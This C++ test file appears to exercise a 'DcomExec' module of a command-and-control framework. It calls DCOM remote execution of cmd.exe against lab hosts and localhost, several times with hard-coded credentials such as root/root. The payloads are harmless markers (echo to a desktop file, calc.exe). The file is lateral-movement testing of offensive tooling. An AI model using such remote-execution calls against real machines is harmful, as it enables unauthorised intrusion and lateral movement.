#include "../DcomExec.hpp"

#include <iostream>
#include <memory>
#include <vector>

int main()
{
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\vuln10\\Desktop\\dcom_test1.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-u", ".\\root", "-p", "root", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\root\\Desktop\\dcom_test2.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-u", ".\\root", "-p", "root", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\root\\Desktop\\dcom_test2.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-h", "192.168.122.177", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\root\\Desktop\\dcom_test1.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-h", "192.168.122.177", "-c", "cmd.exe", "-a", "/c calc.exe"};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-h", "192.168.122.177", "-u", ".\\root", "-p", "root", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\root\\Desktop\\dcom_test666.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-h", "192.168.122.177", "-u", "root", "-p", "toor", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\root\\Desktop\\dcom_test2.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-h", "192.168.122.59", "-u", ".\\root", "-p", "root", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\root\\Desktop\\dcom_test2.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-h", "localhost", "-k", "host/DESKTOP-0HOG7VE", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\vuln\\Desktop\\dcom_test3.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }
    {
        std::unique_ptr<DcomExec> module = std::make_unique<DcomExec>();
        std::vector<std::string> cmd = {"dcomExec", "-h", "localhost", "-n", "-c", "cmd.exe", "-a", "\"/c", "echo", "ran", ">", "C:\\Users\\vuln\\Desktop\\dcom_test4.txt\""};
        C2Message message;
        C2Message ret;

        module->init(cmd, message);
        module->process(message, ret);

        std::string err;
        module->errorCodeToMsg(ret, err);

        std::cout << ret.returnvalue() << std::endl;
        std::cerr << err << std::endl;
    }

    std::cout << "Finished" << std::endl;
    return 0;
}



